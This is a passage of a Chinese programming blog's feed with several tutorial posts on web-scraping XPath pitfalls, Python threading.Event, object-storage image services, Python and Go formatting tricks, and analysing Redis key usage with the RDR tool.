浏览器修饰甚至大幅度增删后的 HTML 代码。当网站有异步加载时，JavaScript 可以轻易在这里增加、删除非常多的内容。即使网站没有异步加载，如果网站原始的 HTML 代码编写不够规范，或者存在一些错漏，那么 Chrome 浏览器会自动纠错和调整。</p><p>以本文的例子来说，在 HTML 的官方规范里面，表格的正文确实应该包在<code>&lt;tbody&gt;&lt;/tbody&gt;</code>标签里面。但现在大多数情况下，前端开发者都会省略这个标签，所以真正的源代码里面是没有这个标签的。而 Chrome 会自动识别到这种情况，然后自动加上这个标签，所以在开发者工具里面看到的 HTML 代码是有这个标签的。</p><p>当你写爬虫的时候，不仅仅是 Chrome 开发者工具里面复制的 XPath 仅作参考，甚至这个开发者工具里面显示的 HTML 代码也是仅作参考。你应该首先检查你需要的数据是不是在真正的源代码里面，然后再来确定是写 XPath 还是抓接口。如果是写 XPath，那么更应该以这个真正的源代码为准，而不是开发者工具里面的 HTML 代码。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有一些同学在写爬虫的时候，喜欢在Chrome 开发者工具里面直接复制 XPath，如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-03-19-46-58.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;他们觉得这样复制出来的 XPath 虽然长了点，但是工作一切正常，所以频繁使用。&lt;/p&gt;
&lt;p&gt;但我希望大家不要过于依赖这个功能。因为它给出的结果仅作参考，有时候并不能让你提取出数据。我们来看一个例子。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="XPath" scheme="https://www.kingname.info/tags/XPath/"/>
    
      <category term="Chrome" scheme="https://www.kingname.info/tags/Chrome/"/>
    
  </entry>
  
  <entry>
    <title>前天才讲的知识点，不听讲的人今天就跑来问</title>
    <link href="https://www.kingname.info/2021/04/05/thread-event/"/>
    <id>https://www.kingname.info/2021/04/05/thread-event/</id>
    <published>2021-04-05T15:02:11.000Z</published>
    <updated>2021-05-14T15:06:58.514Z</updated>
    
    <content type="html"><![CDATA[<p> 今天在读者交流群里面，有同学提到这样一个问题：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-04-06-20-32-34.png" alt></p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-04-06-20-32-51.png" alt></p><p>这个同学想实现，在代码第35行，如果进入了 <code>if</code> 判断，那么就退出第40-43行对应的 ac 函数。</p><p>能问出这个问题，说明这个同学显然没有认真看我的微信公众号。就在几天前我才发了一篇文章：<a href="https://mp.weixin.qq.com/s/po6wGCF_Ww8xDJKgEywZ0g" target="_blank" rel="noopener">一日一技：Python多线程的事件监控</a>。使用这篇文章里面讲到的方法，就可以轻易实现他的需求。</p><p>在那篇文章中，我们讲到了<code>threading.Event</code>，这个东西不仅可以在线程之间使用，也可以在主线程和子线程之间使用。</p><a id="more"></a><p>这个同学的代码不够清晰，我们稍稍修改一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, endtime)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        print(<span class="string">'ac 函数将会在：'</span>, endtime, <span class="string">'停止'</span>)</span><br><span class="line">        self.endtime = endtime</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            now = datetime.datetime.now()</span><br><span class="line">            <span class="keyword">if</span> now &gt; self.endtime:</span><br><span class="line">                print(<span class="string">'结束主线程'</span>)</span><br><span class="line">                <span class="comment"># <span class="doctag">TODO:</span> 这里需要做点什么事情</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ac</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">'主线程正在运行，现在时间'</span>, datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=<span class="number">60</span>)</span><br><span class="line">    monitor = Monitor(stop_time)</span><br><span class="line">    monitor.start()</span><br><span class="line">    ac()</span><br></pre></td></tr></table></figure><p>如果你直接运行上面这段代码，你会发现程序每5秒钟会通过<code>ac</code>函数打印一条字符串，但永远不会停止。现在，我们在 需要在<code>#TODO</code>的位置怎么写代码，才能让程序停止呢？这个时候，我们把<code>threading.Event</code>引入进来。在外面生成并传给子线程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monitor</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, endtime, event)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.endtime = endtime</span><br><span class="line">        print(<span class="string">'ac 函数将会在：'</span>, endtime, <span class="string">'停止'</span>)</span><br><span class="line">        self.event = event</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            now = datetime.datetime.now()</span><br><span class="line">            <span class="keyword">if</span> now &gt; self.endtime:</span><br><span class="line">                print(<span class="string">'结束主线程'</span>)</span><br><span class="line">                self.event.set()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ac</span><span class="params">(event)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> event.is_set():</span><br><span class="line">        print(<span class="string">'主线程正在运行，现在时间'</span>, datetime.datetime.now().strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>))</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    stop_time = datetime.datetime.now() + datetime.timedelta(seconds=<span class="number">60</span>)</span><br><span class="line">    monitor = Monitor(stop_time, event)</span><br><span class="line">    monitor.start()</span><br><span class="line">    ac(event)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-04-06-20-59-47.png" alt></p><p>当子线程检测到满足结束条件的时候，调用<code>event.set()</code>。主线程里面，<code>ac</code>函数使用一个循环不停检测<code>event.is_set()</code>。一开始<code>event.is_set()</code>始终返回 <code>False</code>，直到<code>event.set()</code>以后，就返回 True。这样一来，<code>ac</code>函数就像是收到了通知，于是可以结束函数的运行了。</p><p>如果大家有任何编程上的问题，可以进入未闻 Code 读者交流微信群提问。目前交流群一群、二群已经慢了，三群正在等待更多同学的加入。加我微信号<code>mekingname</code>，备注<code>粉丝群</code>就可以进入。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 今天在读者交流群里面，有同学提到这样一个问题：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-04-06-20-32-34.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-04-06-20-32-51.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;这个同学想实现，在代码第35行，如果进入了 &lt;code&gt;if&lt;/code&gt; 判断，那么就退出第40-43行对应的 ac 函数。&lt;/p&gt;
&lt;p&gt;能问出这个问题，说明这个同学显然没有认真看我的微信公众号。就在几天前我才发了一篇文章：&lt;a href=&quot;https://mp.weixin.qq.com/s/po6wGCF_Ww8xDJKgEywZ0g&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一日一技：Python多线程的事件监控&lt;/a&gt;。使用这篇文章里面讲到的方法，就可以轻易实现他的需求。&lt;/p&gt;
&lt;p&gt;在那篇文章中，我们讲到了&lt;code&gt;threading.Event&lt;/code&gt;，这个东西不仅可以在线程之间使用，也可以在主线程和子线程之间使用。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="多线程" scheme="https://www.kingname.info/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>开发经验：已经有对象储存，为什么我们还要开发一个图片接口？</title>
    <link href="https://www.kingname.info/2021/04/05/why-wrap-oos/"/>
    <id>https://www.kingname.info/2021/04/05/why-wrap-oos/</id>
    <published>2021-04-05T15:02:11.000Z</published>
    <updated>2021-05-14T15:03:31.304Z</updated>
    
    <content type="html"><![CDATA[<p>现在阿里云，腾讯云等等云服务商都已经提供对象储存服务，我们可以使用对象储存来存放文件或者图片。通过云服务商提供的 SDK，一行代码就可以把文件或者图片上传到对象储存，并获得文件的地址。</p><p>我的博客图片就使用腾讯云的对象储存作为图床，所以如果你查看图片的地址，会发现他们的网址是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/IMG_5551.JPEG</span><br></pre></td></tr></table></figure><p>其中的<code>https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/</code>就是我的对象储存的域名。</p><p>然而，在公司的项目中，虽然我们也是用云服务商提供的对象储存来存放图片，但是我们会额外开发一个图片服务接口。所以，公司项目网站的图片，使用的地址类似于：<code>https://img.kingname.info/xxx.png</code>。当你访问这个地址的时候，这个图片服务会从域名拿到图片的名字<code>xxx.png</code>，然后访问对象储存拿到这张图片，最后再把这种图片以数据流的形式返回给你。</p><p>你可能会觉得，这不是多此一举吗？为什么不能让用户直接访问对象储存获得图片呢？单独做一个图片接口不仅增加了开发时间，而且还需要服务器单独再发一次请求到对象储存拿数据，白白增加了访问延迟，怎么看都是得不偿失啊。</p><p>这是因为，工程上的问题，有时候不仅仅是一个行与不行的问题。它需要考虑很多额外的因素。</p><a id="more"></a><h2 id="迁移的成本"><a href="#迁移的成本" class="headerlink" title="迁移的成本"></a>迁移的成本</h2><p>首先要考虑的一个问题是未来是否会更换云服务商。现在我用腾讯云的对象储存，我有一张图片的地址是<code>https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/IMG_5551.JPEG</code>，未来我要换到七牛云去了。图片文件我可以写个 Python 脚本，一键同步到新的对象储存里面去。但是我的图片地址应该怎么改？</p><p>对于新闻类网站或者 App 来说，新闻里面的图片一般都跟正文一起，以 HTML 代码的形式存放到数据库中了。如果我要迁移对象储存，岂不是要扫描一次数据库，把所有图片地址的前半截批量更新为新的地址？对整个数据库进行这样的更新是非常危险的，很容易导致数据损坏或者服务长时间停机。</p><p>但如果我们在对象储存上层有一个自己的图片服务，那么只需要更新图片服务内部的访问原始图片的逻辑就可以了。已有的新闻原始数据不需要做任何改动就能直接使用。</p><h2 id="安全性考虑"><a href="#安全性考虑" class="headerlink" title="安全性考虑"></a>安全性考虑</h2><p>如果使用对像储存，那么所有拿到图片地址的人都能够访问这张图片。假设我们有一篇新闻因为某种原因被删除了，用户已经不能访问这篇新闻了。但是之前拿到了这篇新闻图片的人，还可以通过对象储存对应的图片地址访问这张图片。这可能会被别有用心的人拿来利用，通过发送一篇不和谐的文章配上不和谐的图片，然后举报文章，发现文章被删除以后，再举报图片没有删除。</p><p>那可不可以删除新闻的同时把对应的原始图片也删除了呢？其实也不行。因为新闻一般是假删除。也就是在数据库中设置一个标注，让网站不再显示这篇新闻。例如一篇有版权争议的文章，收到原作者投诉以后，我们需要先把这篇文章撤下，然后商务会跟原作者沟通，获得授权以后再把文章重新打开。可是对象储存没有这样临时冻结图片的功能，删了就真的没有了。</p><p>但如果我们在对象储存上层加一个图片服务。用户访问图片的时候，我们先检查这张图片对应的新闻是否能够访问，如果能够访问，再去对象储存拉取图片返回给用户。这样就能降低被有心人利用的风险。</p><h2 id="功能扩展性"><a href="#功能扩展性" class="headerlink" title="功能扩展性"></a>功能扩展性</h2><p>对象储存提供文件存取功能外，还会提供一些简单的文件处理功能。但有时候我们需要一些自定义的功能，此时不得不再包装一层图片服务。</p><p>例如我们想在图片上加水印。对象储存提供的水印服务功能是在图片上传的时候直接修改原始图片文件，一旦添加就再也不能修改了。如果后面我想修改水印的内容，那么只能让新的图片使用新的水印，老的图片还是老的水印。</p><p>而如果我们有一个图片服务，那么可以在对象储存中直接存放原始图片。而图片服务拿到图片原文件以后，动态添加水印，再返回给调用者。这样一来，当我们要修改水印内容的时候，只需要修改图片服务接口就可以同步更新所有历史图片。</p><p>又比如，大家都知道最近因为棉花的事情，很多综艺节目突然出现了大面积的马赛克。因为有些赞助商的标志不能播放了。这可累死了这些节目的后期剪辑人员。新闻图片其实也会面临这种问题。但我们网站上有几千万篇新闻，显然我们不可能有人力去筛选每一篇新闻的图片。这个时候，我们只需要在图片服务中加上图片识别的功能，发现图片含有这些公司的商标，自动给图片加上高斯模糊。轻松解决问题。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>有一句话说得好，在计算机领域，没有什么问题是不能通过增加若干个中间层搞定的。在一些可能发生变故的地方，提前设置一些中间层，那么一开始可能仅仅只是简单的数据转发。但等到后面要对功能进行增强的时候，这些中间层往往能起到意想不到的作用。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在阿里云，腾讯云等等云服务商都已经提供对象储存服务，我们可以使用对象储存来存放文件或者图片。通过云服务商提供的 SDK，一行代码就可以把文件或者图片上传到对象储存，并获得文件的地址。&lt;/p&gt;
&lt;p&gt;我的博客图片就使用腾讯云的对象储存作为图床，所以如果你查看图片的地址，会发现他们的网址是这样的：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/IMG_5551.JPEG&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;其中的&lt;code&gt;https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/&lt;/code&gt;就是我的对象储存的域名。&lt;/p&gt;
&lt;p&gt;然而，在公司的项目中，虽然我们也是用云服务商提供的对象储存来存放图片，但是我们会额外开发一个图片服务接口。所以，公司项目网站的图片，使用的地址类似于：&lt;code&gt;https://img.kingname.info/xxx.png&lt;/code&gt;。当你访问这个地址的时候，这个图片服务会从域名拿到图片的名字&lt;code&gt;xxx.png&lt;/code&gt;，然后访问对象储存拿到这张图片，最后再把这种图片以数据流的形式返回给你。&lt;/p&gt;
&lt;p&gt;你可能会觉得，这不是多此一举吗？为什么不能让用户直接访问对象储存获得图片呢？单独做一个图片接口不仅增加了开发时间，而且还需要服务器单独再发一次请求到对象储存拿数据，白白增加了访问延迟，怎么看都是得不偿失啊。&lt;/p&gt;
&lt;p&gt;这是因为，工程上的问题，有时候不仅仅是一个行与不行的问题。它需要考虑很多额外的因素。&lt;/p&gt;
    
    </summary>
    
      <category term="开发经验" scheme="https://www.kingname.info/categories/%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"/>
    
    
      <category term="开发经验" scheme="https://www.kingname.info/tags/%E5%BC%80%E5%8F%91%E7%BB%8F%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：一根短横线在Golang 和 Python 中的妙用。</title>
    <link href="https://www.kingname.info/2021/03/22/use/"/>
    <id>https://www.kingname.info/2021/03/22/use/</id>
    <published>2021-03-22T14:59:33.000Z</published>
    <updated>2021-05-14T15:01:08.844Z</updated>
    
    <content type="html"><![CDATA[<p>一根不起眼的短横线，在 Golang 和 Python 中，都能够让你不输出某些不想要的字符。</p><a id="more"></a><h2 id="不输出日期时间前面的0"><a href="#不输出日期时间前面的0" class="headerlink" title="不输出日期时间前面的0"></a>不输出日期时间前面的0</h2><p>我们在使用 Python 输出时间日期的时候，一般格式是这样的：<code>YYYY-mm-dd  :MM:SS</code>，例如：<code>2021-03-22 09:10:12</code>。可以看到<code>03</code>和<code>09</code>前面都有一个0。这样做的好处，是可以让日期时间保持相同的长度，于是就可以通过字符串的方式比较大小。</p><p>但有时候，因为某些原因，你可能确实不想补0，你就想输出<code>2021-3-22 9:10:12</code>这种格式的时间。</p><p>但我们知道，在 Python 里面把日期时间格式化输出，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.datetime.now()</span><br><span class="line">dt_str = now.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>)</span><br></pre></td></tr></table></figure><p>在这个格式化符号里面，可以看到我们本身就使用的是一个字符，月份就是<code>%m</code>，难道还有另外一个符号用来表示不补0的日期？</p><p>实际上，不补0并不需要另外一个符号来表示，我们只需要在<code>%</code>和<code>m</code>之间加上一根短横线就可以了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">now = datetime.datetime.now()</span><br><span class="line">dt_str = now.strftime(<span class="string">'%Y-%-m-%-d %-H:%-M:%-S'</span>)</span><br><span class="line">print(dt_str)</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-22-21-06-08.png" alt></p><h2 id="Golang-结构体与-JSON-的互相转换"><a href="#Golang-结构体与-JSON-的互相转换" class="headerlink" title="Golang 结构体与 JSON 的互相转换"></a>Golang 结构体与 JSON 的互相转换</h2><p>在使用 Golang 的时候，我们有时候需要在结构体和 JSON 字符串之间互相转换。在转换的工程中，可能会发现有些字段是多余的。我们不想让 JSON中的某些字段转到结构体里面，或者不想让结构体里面的某些字段转到 JSON 中去。</p><p>对于从 JSON 转到结构体，要忽略字段非常简单，例如有如下一个 JSON 字符串：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"name"</span>: <span class="string">"kingname"</span>, <span class="string">"salary"</span>: <span class="number">999999999</span>, <span class="string">"address"</span>: <span class="string">"上海"</span>, <span class="string">"handsome"</span>: true&#125;</span><br></pre></td></tr></table></figure><p>在转成结构体的时候，我不想要<code>handsome</code>这个字段，于是可以这样写代码：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"encoding/json"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Info <span class="keyword">struct</span> &#123;</span><br><span class="line">Name    <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">Salary  <span class="keyword">int64</span>  <span class="string">`json:"salary"`</span></span><br><span class="line">Address <span class="keyword">string</span> <span class="string">`json:"address"`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">jsonstr := <span class="string">`&#123;"name": "kingname", "salary": 999999999, "address": "上海", "handsome": true&#125;`</span></span><br><span class="line"><span class="keyword">var</span> info Info</span><br><span class="line">err := json.Unmarshal([]<span class="keyword">byte</span>(jsonstr), &amp;info)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(err)</span><br><span class="line">    &#125;</span><br><span class="line">fmt.Println(info)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-22-20-44-56.png" alt></p><p>但问题是，如果现在给你一个结构体，但是转成 JSON 的时候不想要其中一个字段，应该怎么操作？可能有人会以为，在定义结果体的时候，不要加上<code>json:&quot;xxx&quot;</code>就可以了。但实际执行的效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-22-20-49-42.png" alt></p><p>Golang 会直接使用这个字段在结构体中的名字来转成 JSON。</p><p>如果不想要这个字段，实际上有一个非常简单的办法，就是在定义结构体的时候，加上<code>json:&quot;-&quot;</code>，例如：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Info <span class="keyword">struct</span> &#123;</span><br><span class="line">Name     <span class="keyword">string</span> <span class="string">`json:"name"`</span></span><br><span class="line">Salary   <span class="keyword">int64</span>  <span class="string">`json:"salary"`</span></span><br><span class="line">Address  <span class="keyword">string</span> <span class="string">`json:"address"`</span></span><br><span class="line">Handsome <span class="keyword">bool</span>   <span class="string">`json:"-"`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-03-22-20-52-43.png" alt></p><p>通过指定这个横线，就能忽略这个字段了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一根不起眼的短横线，在 Golang 和 Python 中，都能够让你不输出某些不想要的字符。&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="https://www.kingname.info/categories/Python/"/>
    
    
      <category term="Python" scheme="https://www.kingname.info/tags/Python/"/>
    
      <category term="Golang" scheme="https://www.kingname.info/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：可视化分析 Redis Key 资源占用情况</title>
    <link href="https://www.kingname.info/2021/02/26/redis-dashboard/"/>
    <id>https://www.kingname.info/2021/02/26/redis-dashboard/</id>
    <published>2021-02-26T14:13:24.000Z</published>
    <updated>2021-05-14T14:36:27.506Z</updated>
    
    <content type="html"><![CDATA[<p>Redis 在日常的开发中，会积累大量的 Key，占用不少内存空间。有时候，我们想知道当前 Redis 里面有多少个 Key，是哪个 Key 占用了最大的内存。</p><p>但是，我们知道，由于 Redis 是单线程数据库，所以在线上环境是绝对禁止使用<code>keys *</code>这种命令的，因为它会花费很长时间扫描所有的 Key，在这个过程中，Redis 会卡死，无法处理其他的读写操作。</p><p>那么，我们应该怎么知道当前有多少个 Key 呢？有同学说可以使用<code>scan</code>命令。但这个命令一方面是需要写程序来迭代，另一方面是它给出的结果可能是不准确的。</p><a id="more"></a><p>也有同学会说，可以使用<code>info keyspace</code>命令，运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-02-26-20-48-27.png" alt></p><p>确实可以看到有多少个 Key。不过另一个问题是，怎么知道哪个 Key 占用的内存空间最大？</p><p>还有时候，Redis 里面可能有几万十几万个 Key，里面有些 Key 是可以删掉的。但是由于我们不能使用<code>keys</code>命令查看当前有哪些 Key，所以不知道这些可以删掉的 Key 竟然还在。</p><p>实际上，这些问题，我们使用一个叫做<a href="https://github.com/xueqiu/rdr" target="_blank" rel="noopener">RDR</a>的工具，都可以解决。在 RDR 的 Github 上，可以找到对应系统的可执行文件。我们以 Linux 版本为例来进行说明。Linux 版本的可执行文件地址为：<code>https://github.com/xueqiu/rdr/releases/download/v0.0.1/rdr-linux</code>，下载以后，赋予可执行权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">wget https://github.com/xueqiu/rdr/releases/download/v0.0.1/rdr-linux</span><br><span class="line">chmod +x rdr-linux</span><br></pre></td></tr></table></figure><p>接下来，我们需要找到 <code>dump.rdb</code>文件。</p><p>Redis 默认开启了<code>RDB</code>方式的持久化储存。满足一定条件时，Redis 会把内存中的数据存放到硬盘中，防止由于突然断电导致数据丢失。默认情况下，RDB 文件在<code>/var/lib/redis/dump.rdb</code>，这个文件只有 root 用户可以读取。</p><p>如果你现在不是 root 用户，那么你可以把它复制出来，修改成当前用户，我的 Linux 系统当前用户名叫做 kingname，所在的用户组也叫 kingname，所以可以执行如下 shell 命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~</span><br><span class="line">sudo cp /var/lib/redis/dump.rdb ./</span><br><span class="line">sudo chown kingname:kinganme dump.rdb</span><br></pre></td></tr></table></figure><p>修改了用户以后，现在我们让 RDR 来读取这个RDB 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rdr-linux show -p 8766 dump.rdb</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-02-26-20-57-12.png" alt></p><p>现在，打开浏览器，打开<code>http://IP:8766</code>，就可以看到当前 Redis 的各个 Key 的统计信息：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2021-02-26-20-58-22.png" alt></p><p>不仅可以看到Redis 有哪些 Key，还能看到每个 Key 里面有多少元素，大小是多少。</p><p>而且由于是分析的 RDB 文件，所以也完全不需要担心对线上数据造成任何影响。</p><p>有了这个工具以后，要找出占用空间最大的 Key，就非常简单了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Redis 在日常的开发中，会积累大量的 Key，占用不少内存空间。有时候，我们想知道当前 Redis 里面有多少个 Key，是哪个 Key 占用了最大的内存。&lt;/p&gt;
&lt;p&gt;但是，我们知道，由于 Redis 是单线程数据库，所以在线上环境是绝对禁止使用&lt;code&gt;keys *&lt;/code&gt;这种命令的，因为它会花费很长时间扫描所有的 Key，在这个过程中，Redis 会卡死，无法处理其他的读写操作。&lt;/p&gt;
